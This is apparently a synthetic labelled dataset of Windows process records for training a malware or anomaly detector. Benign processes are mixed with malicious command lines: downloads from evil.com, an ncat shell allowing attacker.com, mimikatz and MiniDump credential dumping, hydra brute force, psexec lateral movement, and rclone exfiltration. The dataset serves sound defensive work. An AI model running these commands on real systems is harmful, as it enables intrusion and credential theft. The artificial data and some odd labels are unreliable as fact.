process_name,cmdline,cpu_usage,memory_usage,has_network,connections,is_system_user,label,source,severity
mintty.exe,mintty.exe,10.534389271054556,2.5528322416188765,1,11,0,normal,synthetic_normal,
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,53.91106317242416,22.448386858076372,0,4,0,malware,mitre_malicious_scripts,high
OneDrive.exe,OneDrive.exe,19.95008752917089,3.1935887989684284,0,16,0,normal,synthetic_normal,
NisSrv.exe,NisSrv.exe,22.968864766235942,6.974024699519821,0,2,0,normal,synthetic_normal,
hoic.exe,hoic.exe,94.36852988373657,20.14103894987117,1,615,0,ddos,ddos_tools,
rustup.exe,rustup.exe,8.377736130505735,3.861466564950189,0,3,0,normal,synthetic_normal,
rustup.exe,rustup.exe,17.249487360318795,6.037463021849299,1,18,0,normal,synthetic_normal,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",48.220615899181745,14.173817288294535,1,245,0,brute_force,brute_force_tools,
wmiprvse.exe,wmiprvse.exe,22.4371503878382,7.9468375245965,1,0,0,normal,synthetic_normal,
smss.exe,smss.exe,10.455939318835467,0.5689828632273648,1,4,0,normal,synthetic_normal,
SyncThing.exe,SyncThing.exe,2.235174888773477,6.026988912211763,0,17,0,normal,synthetic_normal,
Signal.exe,Signal.exe,25.32725432681925,4.482110352143015,1,6,0,normal,synthetic_normal,
rclone.exe,rclone.exe sync C:\Users\Documents mega:backup,56.45205899560843,11.354089470458346,1,10,0,data_exfiltration,mitre_data_exfiltration,high
MSACCESS.EXE,MSACCESS.EXE,8.057338157433744,7.8835866588161005,0,6,0,normal,synthetic_normal,
ursnif.exe,ursnif.exe --silent,90.24876382008577,24.570403340800933,1,15,0,malware,known_malware,
rollup.exe,rollup.exe,7.079723381798572,5.480687428859221,0,19,0,normal,synthetic_normal,
zloader.exe,zloader.exe --silent,68.87094053935442,22.764023689554364,1,18,0,malware,known_malware,
wmiprvse.exe,wmiprvse.exe,6.188981857628396,2.593237069592512,0,1,0,normal,synthetic_normal,
darkcomet.exe,darkcomet.exe --silent,83.61792617598002,35.65113198295312,1,26,0,malware,known_malware,
pwsh.exe,pwsh.exe,26.617336479574533,4.003196981793482,0,18,0,normal,synthetic_normal,
vlc.exe,vlc.exe,10.057868175446231,7.520515397897703,0,3,0,normal,synthetic_normal,
npm.exe,npm.exe,22.74197944843739,2.4609027705207867,0,19,0,normal,synthetic_normal,
cpuminer.exe,cpuminer.exe --silent,76.59638563552033,19.445776210508797,1,18,0,ddos,known_malware,
vite.exe,vite.exe,29.543762142167864,4.322369142015658,0,11,0,normal,synthetic_normal,
rustup.exe,rustup.exe,3.427412414083839,7.5864144217161,0,17,0,normal,synthetic_normal,
cargo.exe,cargo.exe,24.595834281457854,1.396157036893804,0,19,0,normal,synthetic_normal,
idea64.exe,idea64.exe,2.288413978819582,6.854273871422781,0,10,0,normal,synthetic_normal,
firefox.exe,firefox.exe,45.28868624702669,19.705619331541552,0,1,0,normal,synthetic_normal,
Teams.exe,Teams.exe,6.209406760397,1.0809594718348712,1,16,0,normal,synthetic_normal,
csrs.exe,csrs.exe --silent,91.9368542898777,20.21913415100011,1,29,0,trojan,known_malware,
rclone.exe,rclone.exe sync C:\Users\Documents mega:backup,77.70573069915848,15.212530931898351,1,8,0,data_exfiltration,mitre_data_exfiltration,high
hoic.exe,hoic.exe,95.96938332016587,28.365101948882323,1,1348,0,ddos,ddos_tools,
ncat.exe,ncat.exe --exec cmd.exe --allow attacker.com -l 4444,75.48766662398722,6.75765395797395,1,3,0,trojan,mitre_command_control,critical
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,43.4664961829016,5.781513904298698,1,340,0,brute_force,brute_force_tools,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,56.29088808964423,15.9606476499472,1,200,0,brute_force,brute_force_tools,
lockbit.exe,lockbit.exe --silent,58.26719425110048,24.385729776272385,1,8,0,ransomware,known_malware,
mpc-hc64.exe,mpc-hc64.exe,12.992112171069255,0.7546951303663186,1,17,0,normal,synthetic_normal,
Zoom.exe,Zoom.exe,9.35317905351496,0.733180886299764,0,20,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,84.92189667081762,11.44460534303781,1,1425,0,ddos,ddos_tools,
Autoruns64.exe,Autoruns64.exe,26.854283759859424,3.7893812484995384,0,6,0,normal,synthetic_normal,
git.exe,git.exe,5.601725287808774,7.091158263439925,0,7,0,normal,synthetic_normal,
ntdsutil.exe,"ntdsutil.exe ""ac i ntds"" ifm",29.10741156961637,14.397389200714954,0,6,0,credential_dumping,mitre_credential_dumping,critical
g++.exe,g++.exe,6.037312826236009,7.532267735752412,0,20,0,normal,synthetic_normal,
webstorm64.exe,webstorm64.exe,24.16466592725263,3.800776223260386,1,9,0,normal,synthetic_normal,
procexp64.exe,procexp64.exe,11.32710263579204,4.789102843200266,0,15,0,normal,synthetic_normal,
postgres.exe,postgres.exe,18.740049289550985,7.577341823368728,1,13,0,normal,synthetic_normal,
SecurityHealthSystray.exe,SecurityHealthSystray.exe,5.3114534869731145,5.044318173856666,0,9,0,normal,synthetic_normal,
spoolsv.exe,spoolsv.exe,19.9955947176581,1.9554916659740793,0,15,0,normal,synthetic_normal,
tcpview.exe,tcpview.exe,2.143610886419627,2.638847012605644,0,18,0,normal,synthetic_normal,
explorer.exe,explorer.exe,15.403534484301067,3.2262724386912227,0,0,0,normal,synthetic_normal,
dotnet.exe,dotnet.exe,4.290320477851257,2.7390359142254943,0,9,0,normal,synthetic_normal,
idea64.exe,idea64.exe,5.185760115263331,7.711109095407526,0,15,0,normal,synthetic_normal,
lsass32.exe,lsass32.exe --silent,45.635373570188165,30.55182168577885,1,3,0,trojan,known_malware,
pycharm64.exe,pycharm64.exe,16.164253954616164,0.9345082264161554,0,5,0,normal,synthetic_normal,
svhost.exe,svhost.exe --silent,46.2390871596738,34.18399605294289,1,5,0,malware,known_malware,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,68.79722852422496,14.59471337605217,1,358,0,brute_force,brute_force_tools,
empire,launcher.bat,23.830777120712654,12.458368074385968,1,1,0,trojan,mitre_command_control,critical
explore.exe,explore.exe --silent,58.90070891888473,39.051907836928784,1,11,0,trojan,known_malware,
csrss.exe,csrss.exe,4.000049817883128,5.520996497067822,1,11,0,normal,synthetic_normal,
Spotify.exe,Spotify.exe,15.804277918907989,1.734904193964672,0,19,0,normal,synthetic_normal,
Registry,Registry,23.688167378748084,2.7104771133420567,0,15,0,normal,synthetic_normal,
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,55.540683970759446,5.948171365354176,1,482,0,brute_force,brute_force_tools,
bash.exe,bash.exe,4.3416014039912385,7.192661032194652,1,13,0,normal,synthetic_normal,
OBS64.exe,OBS64.exe,28.09306130293994,4.596659531643009,0,2,0,normal,synthetic_normal,
adrecon.ps1,powershell.exe ./ADRecon.ps1,69.23774513110061,9.559297439052703,0,6,0,reconnaissance,mitre_reconnaissance,high
certutil.exe,certutil.exe -urlcache -split -f http://evil.com/malware.exe,73.5421923451092,17.793874095558373,0,0,0,malware,mitre_download_execute,high
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,85.6701492259926,34.489987744897384,1,1902,0,ddos,ddos_tools,
goland64.exe,goland64.exe,8.903764961095469,2.4441453833077027,1,6,0,normal,synthetic_normal,
npm.exe,npm.exe,9.289419387880937,6.185320281461365,1,2,0,normal,synthetic_normal,
revil.exe,revil.exe --silent,70.81088514889379,14.975642926810135,1,18,0,ransomware,known_malware,
WindowsTerminal.exe,WindowsTerminal.exe,5.960899451976349,4.120700854082281,0,2,0,normal,synthetic_normal,
ryuk.exe,ryuk.exe --silent,54.56834569155225,12.65079702338516,1,4,0,ransomware,known_malware,
winrm.cmd,winrs -r:target cmd,57.473616651241414,23.796825973477628,1,4,0,lateral_movement,mitre_lateral_movement,medium
atexec.py,python atexec.py user:pass@target,55.63173196420554,17.66639489292629,1,6,0,lateral_movement,mitre_lateral_movement,high
ConEmuC.exe,ConEmuC.exe,11.387763164174366,2.3979523787540016,0,0,0,normal,synthetic_normal,
g++.exe,g++.exe,1.7230304389480589,0.7949617989399173,0,8,0,normal,synthetic_normal,
python.exe,python.exe,13.768062065780951,19.703685554754852,1,14,0,normal,synthetic_normal,
Spotify.exe,Spotify.exe,9.086911023532915,1.659322141751439,1,4,0,normal,synthetic_normal,
comsvcs.dll,rundll32.exe comsvcs.dll MiniDump,52.29307387075454,12.57333087692704,0,10,0,credential_dumping,mitre_credential_dumping,critical
hive.exe,hive.exe --silent,45.119534412935344,15.492279635686334,1,23,0,malware,known_malware,
RuntimeBroker.exe,RuntimeBroker.exe,17.66225072814325,1.9555776713968038,1,2,0,normal,synthetic_normal,
npx.exe,npx.exe,12.126891601457212,3.3816710804572434,0,4,0,normal,synthetic_normal,
SearchApp.exe,SearchApp.exe,21.860360448030598,4.348207550975454,0,10,0,normal,synthetic_normal,
qbot.exe,qbot.exe --silent,83.00716503394082,13.52689419393555,1,13,0,malware,known_malware,
ConEmuC64.exe,ConEmuC64.exe,0.48703442119181317,4.772242618132773,0,8,0,normal,synthetic_normal,
iCloudServices.exe,iCloudServices.exe,11.21694844154209,4.605946594649211,1,5,0,normal,synthetic_normal,
rider64.exe,rider64.exe,6.644408840393227,4.033698231900051,0,7,0,normal,synthetic_normal,
wmic.exe,wmic.exe /node:target process call create,77.13636509192506,18.438131083144093,1,10,0,lateral_movement,mitre_lateral_movement,high
OneDrive.exe,OneDrive.exe,23.274565236466625,2.336186070575236,1,14,0,normal,synthetic_normal,
devenv.exe,devenv.exe,25.93347688203267,0.9833097344714743,1,0,0,normal,synthetic_normal,
Skype.exe,Skype.exe,9.288116133822186,2.874121829516406,0,13,0,normal,synthetic_normal,
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,87.07680019495754,16.75885942132097,1,344,0,brute_force,brute_force_tools,
wmplayer.exe,wmplayer.exe,28.268161546862697,0.8137734286660367,0,5,0,normal,synthetic_normal,
conficker.exe,conficker.exe --silent,74.9101098703666,10.456674330086294,1,6,0,malware,known_malware,
vlc.exe,vlc.exe,6.463582576860877,3.066053151396255,0,6,0,normal,synthetic_normal,
WINWORD.EXE,WINWORD.EXE,29.59786823369177,1.4771118075440464,0,8,0,normal,synthetic_normal,
conhost.exe,conhost.exe,16.047678122226763,2.7257060632452346,0,9,0,normal,synthetic_normal,
Discord.exe,Discord.exe,3.35721843355973,0.7719274130748119,0,18,0,normal,synthetic_normal,
njrat.exe,njrat.exe --silent,60.412251384688105,13.772559774257807,1,13,0,trojan,known_malware,
hoic.exe,hoic.exe,85.87515388579382,28.427715665982248,1,1211,0,ddos,ddos_tools,
slowloris.py,python slowloris.py target.com,84.0564995324603,35.98234488956652,1,1424,0,ddos,ddos_tools,
psexec.exe,psexec.exe \\target -s cmd.exe,24.934838087725787,12.944212636570526,1,0,0,lateral_movement,mitre_lateral_movement,high
cssrs.exe,cssrs.exe --silent,42.96284242356066,21.02898822115074,1,17,0,malware,known_malware,
git-credential-manager.exe,git-credential-manager.exe,29.805270229507038,7.550118699010654,0,14,0,normal,synthetic_normal,
bcdedit.exe,bcdedit.exe /set {default} recoveryenabled no,25.898904293912036,22.987314215422863,1,0,0,ransomware,mitre_ransomware,high
ConEmuC64.exe,ConEmuC64.exe,11.790534866036698,6.599880235030526,0,19,0,normal,synthetic_normal,
SecurityHealthHost.exe,SecurityHealthHost.exe,10.313908058993242,6.2853814726133095,0,20,0,normal,synthetic_normal,
WmiPrvSE.exe,WmiPrvSE.exe,23.164209320109983,6.609194548879359,0,4,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,87.53561327986745,26.778444367487886,1,1226,0,ddos,ddos_tools,
hping3.exe,hping3.exe --flood -p 80 target.com,98.25171574431084,12.415351848641915,1,802,0,ddos,ddos_tools,
winpeas.exe,winpeas.exe,51.51615814323216,6.608626312937165,0,5,0,privilege_escalation,mitre_privilege_escalation,high
SearchApp.exe,SearchApp.exe,17.442287931060424,7.604028907599575,0,11,0,normal,synthetic_normal,
Blender.exe,Blender.exe,6.471215929522939,6.506917914268195,0,16,0,normal,synthetic_normal,
WINWORD.EXE,WINWORD.EXE,4.235494740358048,2.1966335963317887,1,11,0,normal,synthetic_normal,
advanced_port_scanner.exe,advanced_port_scanner.exe,59.153025794408485,9.78345357260026,0,19,0,reconnaissance,mitre_network_scanning,low
Invoke-WebRequest,powershell.exe Invoke-WebRequest -Uri http://evil.com -OutFile mal.exe,76.94768550738695,17.056403561262307,1,1,0,malware,mitre_download_execute,medium
wsl.exe,wsl.exe,10.727034781965386,7.162371225040129,0,5,0,normal,synthetic_normal,
fish.exe,fish.exe,2.554580816379197,7.402829046083975,1,7,0,normal,synthetic_normal,
lazagne.exe,lazagne.exe all,65.78120423573047,8.986062993254277,0,2,0,credential_dumping,mitre_credential_dumping,high
gpg.exe,gpg.exe,13.928873189891284,2.739663561196448,1,11,0,normal,synthetic_normal,
Telegram.exe,Telegram.exe,9.075336725545784,4.861664307174109,1,7,0,normal,synthetic_normal,
printspoofer.exe,printspoofer.exe -i -c cmd,55.44365696646449,23.567161623718334,0,2,0,privilege_escalation,mitre_privilege_escalation,critical
Photoshop.exe,Photoshop.exe,19.04126380141314,7.428243649202135,1,9,0,normal,synthetic_normal,
conhost.exe,conhost.exe,20.707750996943595,7.4989336351543505,0,18,0,normal,synthetic_normal,
sihost.exe,sihost.exe,26.034478406396868,6.9699844896787235,0,19,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,85.9445981468972,22.562343540903807,1,1890,0,ddos,ddos_tools,
code.exe,code.exe,10.437475659225553,5.540964848237919,0,20,0,normal,synthetic_normal,
dockerd.exe,dockerd.exe,16.710677664779073,3.566353954861146,0,6,0,normal,synthetic_normal,
vlc.exe,vlc.exe,14.06723793642238,5.154856454287273,0,10,0,normal,synthetic_normal,
pwsh.exe,pwsh.exe,25.835555576742205,4.938169570572742,1,7,0,normal,synthetic_normal,
vite.exe,vite.exe,5.388892880899846,6.483415289217768,0,2,0,normal,synthetic_normal,
flash_update.exe,flash_update.exe --silent,65.79010622911159,12.363887639471312,1,2,0,malware,known_malware,
SgrmBroker.exe,SgrmBroker.exe,4.419710595926287,2.1871628650329806,0,3,0,normal,synthetic_normal,
Teams.exe,Teams.exe,14.993606043959534,6.147482147053442,0,3,0,normal,synthetic_normal,
postgres.exe,postgres.exe,22.764727927300573,5.374198488874394,1,14,0,normal,synthetic_normal,
agent_tesla.exe,agent_tesla.exe --silent,49.071196984414954,21.62929309855542,1,21,0,malware,known_malware,
wget.exe,wget.exe http://evil.com/malware.exe,34.34710664488013,23.84379335282351,0,5,0,malware,mitre_download_execute,medium
zsh.exe,zsh.exe,11.759183822939084,5.0326403916320235,0,1,0,normal,synthetic_normal,
mimikatz.exe,mimikatz.exe lsadump::dcsync,61.548475143008105,15.743005520245186,1,4,0,credential_dumping,mitre_credential_dumping,critical
wsl.exe,wsl.exe,17.377663406680135,3.7747506501174106,0,2,0,normal,synthetic_normal,
rustup.exe,rustup.exe,9.349539364956627,3.382128530060148,0,2,0,normal,synthetic_normal,
sublime_text.exe,sublime_text.exe,6.068918873544364,6.853611941674012,0,10,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,80.75170649361205,39.24262303612165,1,816,0,ddos,ddos_tools,
g++.exe,g++.exe,29.602129385864142,7.342423891347984,0,15,0,normal,synthetic_normal,
Dropbox.exe,Dropbox.exe,11.359293245954174,4.874390692739036,1,11,0,normal,synthetic_normal,
javaws.exe,javaws.exe,26.71005397669331,5.223661004491357,0,1,0,normal,synthetic_normal,
SgrmBroker.exe,SgrmBroker.exe,22.778445167388853,2.0472885725615435,1,3,0,normal,synthetic_normal,
Docker Desktop.exe,Docker Desktop.exe,21.10487852499219,5.3672488636944164,0,20,0,normal,synthetic_normal,
Code.exe,Code.exe,1.4149991826102282,2.549281659010699,0,1,0,normal,synthetic_normal,
npx.exe,npx.exe,26.833723199243416,5.368918869021695,0,7,0,normal,synthetic_normal,
dllhost.exe,dllhost.exe,2.851336086620643,4.101048568723257,0,4,0,normal,synthetic_normal,
winlogon.exe,winlogon.exe,0.14087201074155287,5.370325840446121,0,17,0,normal,synthetic_normal,
nanocore.exe,nanocore.exe --silent,55.28327036638599,18.61935878563751,1,30,0,malware,known_malware,
cargo.exe,cargo.exe,15.18870382103697,3.525218354228665,0,4,0,normal,synthetic_normal,
opera.exe,opera.exe,3.260434169143478,2.540373046811485,0,5,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,88.48500901300996,35.01724119956371,1,1236,0,ddos,ddos_tools,
gozi.exe,gozi.exe --silent,80.02571999296862,23.963324993916643,1,25,0,malware,known_malware,
ProcessHacker.exe,ProcessHacker.exe,14.66733949550733,7.093222231735056,0,12,0,normal,synthetic_normal,
git.exe,git.exe,6.498329666700705,5.560551380442077,0,1,0,normal,synthetic_normal,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,67.70655299013217,11.953013271066236,1,381,0,brute_force,brute_force_tools,
slowloris.py,python slowloris.py target.com,86.76289874652741,38.401181436759806,1,579,0,ddos,ddos_tools,
g++.exe,g++.exe,0.5141849232951001,2.0580973361669765,0,10,0,normal,synthetic_normal,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",97.11567326846455,7.718082813597617,1,192,0,brute_force,brute_force_tools,
wmiexec.py,python wmiexec.py admin:pass@target,20.64669237902787,23.909921843069604,1,5,0,lateral_movement,mitre_lateral_movement,critical
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,83.31926153008438,39.91502501655458,1,1373,0,ddos,ddos_tools,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,78.70589276185939,11.85327383591897,1,416,0,brute_force,brute_force_tools,
mysql.exe,mysql.exe,14.860351600785846,3.9472829432252627,0,19,0,normal,synthetic_normal,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,84.68526728708343,19.851687821505305,1,55,0,brute_force,brute_force_tools,
SenseIR.exe,SenseIR.exe,12.86352647956128,5.80099048931185,0,4,0,normal,synthetic_normal,
WhatsApp.exe,WhatsApp.exe,9.998603495193732,4.52904392642061,1,13,0,normal,synthetic_normal,
wmplayer.exe,wmplayer.exe,8.640703339497012,6.464029863763989,1,8,0,normal,synthetic_normal,
rclone.exe,rclone.exe sync C:\Users\Documents mega:backup,36.456377303193605,11.392017719906358,1,7,0,data_exfiltration,mitre_data_exfiltration,high
SecurityHealthService.exe,SecurityHealthService.exe,4.194524589711438,1.9405202682987381,0,3,0,normal,synthetic_normal,
chrome.exe,chrome.exe,2.57480994177628,4.945520236002231,0,20,0,normal,synthetic_normal,
rclone.exe,rclone.exe sync C:\Users\Documents mega:backup,27.020990426620603,11.270305135242587,1,6,0,data_exfiltration,mitre_data_exfiltration,high
csrs.exe,csrs.exe --silent,82.30477853480377,27.672931067321127,1,4,0,trojan,known_malware,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,68.59749695040705,11.116610471066497,1,106,0,brute_force,brute_force_tools,
Illustrator.exe,Illustrator.exe,5.579671615572544,3.0193843366095927,0,16,0,normal,synthetic_normal,
bitsadmin.exe,bitsadmin.exe /transfer job /download http://evil.com/mal.exe,29.863945257128577,23.581799758115718,1,8,0,malware,mitre_download_execute,high
slowloris.py,python slowloris.py target.com,81.88151752297578,29.54277327598615,1,136,0,ddos,ddos_tools,
smss.exe,smss.exe,11.147767494747567,2.927009916698966,0,11,0,normal,synthetic_normal,
rundll.exe,rundll.exe --silent,51.06015653323808,20.9173564984539,1,22,0,malware,known_malware,
WmiPrvSE.exe,WmiPrvSE.exe,18.340921449028798,3.5318515802970265,1,11,0,normal,synthetic_normal,
smartscreen.exe,smartscreen.exe,9.605565854106562,2.8061313826260816,0,13,0,normal,synthetic_normal,
wmplayer.exe,wmplayer.exe,18.57219034455281,4.990588283536226,0,11,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,94.25185835571335,36.70627137564938,1,1560,0,ddos,ddos_tools,
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,82.26018858269958,16.79294288551081,1,259,0,brute_force,brute_force_tools,
smbexec.py,python smbexec.py domain/user:pass@target,42.63260151397729,5.2344764635586465,1,6,0,lateral_movement,mitre_lateral_movement,critical
mshta.exe,mshta.exe http://evil.com/payload.hta,72.22798457908041,6.5731744794597935,1,10,0,malware,mitre_malicious_scripts,critical
hoic.exe,hoic.exe,83.43516752541969,30.37521885624604,1,1422,0,ddos,ddos_tools,
dasHost.exe,dasHost.exe,18.963978557890666,2.6241986348372293,0,4,0,normal,synthetic_normal,
redis-server.exe,redis-server.exe,1.224832706366652,2.6868019196680497,0,8,0,normal,synthetic_normal,
obs64.exe,obs64.exe,19.399340229108077,5.502083264684413,1,18,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe --silent,44.775017172663404,28.42064398600337,1,13,0,ddos,known_malware,
mpc-hc64.exe,mpc-hc64.exe,13.85958489517421,2.1740728320433003,1,0,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,81.65013462082612,23.918112163872294,1,1115,0,ddos,ddos_tools,
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt -M ssh,82.76989456884407,18.914067539484446,1,141,0,brute_force,brute_force_tools,
csrss.exe,csrss.exe,25.953632524549462,1.1096628056641904,0,0,0,normal,synthetic_normal,
wsl.exe,wsl.exe,10.816946959418035,4.139371249293629,0,4,0,normal,synthetic_normal,
msedge.exe,msedge.exe,36.01680298113715,7.35912121566864,0,6,0,normal,synthetic_normal,
lsass.exe,lsass.exe,26.897388619787097,6.788682709295993,0,8,0,normal,synthetic_normal,
mshta.exe,mshta.exe http://evil.com/payload.hta,26.273047571267593,5.716775496555842,1,5,0,malware,mitre_malicious_scripts,critical
MSACCESS.EXE,MSACCESS.EXE,5.290480343243424,1.3477721899848563,0,17,0,normal,synthetic_normal,
psexec64.exe,psexec64.exe -accepteula \\target,65.27118725486842,17.844481489972182,1,8,0,lateral_movement,mitre_lateral_movement,high
clion64.exe,clion64.exe,19.70197454176124,4.990384306132464,0,19,0,normal,synthetic_normal,
wmplayer.exe,wmplayer.exe,14.671098252901421,1.0227926938161565,0,17,0,normal,synthetic_normal,
gpg-agent.exe,gpg-agent.exe,16.074838347265448,4.49337944413447,0,7,0,normal,synthetic_normal,
godpotato.exe,godpotato.exe -cmd cmd /c whoami,47.094305396033846,18.573668258353717,1,7,0,privilege_escalation,mitre_privilege_escalation,critical
cipher.exe,cipher.exe /w:C:,23.505897493146463,16.40573959761813,1,9,0,ransomware,mitre_ransomware,high
audiodg.exe,audiodg.exe,8.314143874388764,5.650744169416553,1,3,0,normal,synthetic_normal,
gpg.exe,gpg.exe,8.440684746939507,4.5176024119034395,0,0,0,normal,synthetic_normal,
